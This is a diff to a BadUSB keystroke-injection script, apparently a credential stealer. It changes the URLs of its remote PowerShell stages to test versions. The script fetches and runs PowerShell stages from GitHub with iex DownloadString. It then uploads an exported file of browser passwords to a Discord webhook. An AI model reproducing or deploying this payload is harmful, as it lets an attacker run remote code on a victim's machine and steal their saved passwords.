@@ -26,7 +26,7 @@ DELAY 1000
 REM edit your webhook here
 STRING $DiscordUrl = 'DISCORD_WEBHOOK'
 ENTER
-STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/W1ns1d3r/W1ns1d3r_n0_4dm1n/stage1.ps1'))
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/W1ns1d3r/W1ns1d3r_t3st/stage1_t3st.ps1'))
 ENTER
 DELAY 5000
 STRING wbpv28821@
@@ -44,5 +44,5 @@ ALT F4
 DELAY 800
 STRING Upload-Discord -file "C:\temp\export.txt" -text "Browser password :"
 ENTER
-STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/W1ns1d3r/W1ns1d3r_n0_4dm1n/stage2.ps1'))
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/W1ns1d3r/W1ns1d3r_t3st/stage2_t3st.ps1'))
 ENTER
